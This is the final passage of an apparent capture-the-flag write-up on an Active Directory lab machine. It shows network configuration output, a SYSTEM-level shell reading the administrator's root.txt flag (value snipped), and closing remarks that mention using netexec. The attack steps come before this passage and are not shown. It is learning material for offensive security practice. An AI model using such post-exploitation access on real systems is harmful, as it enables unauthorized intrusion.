   IPv4 Address. . . . . . . . . . . : 10.129.231.149
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%6
                                       10.129.0.1

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
<---- SNIP USER FLAG ---->

C:\Windows\system32>

```

It's clear that this machine offers a wealth of learning opportunities for those venturing into the world of Active Directory exploitation. Most of the things I have seen before in CTF machines, but this time I used netexec instead of crackmapexec since the latter is not supported anymore.

Remember, the journey of a hacker is one of continuous learning and adaptation. So, keep practicing, stay curious, and embrace the thrill of discovery in your cybersecurity endeavors. Happy hacking!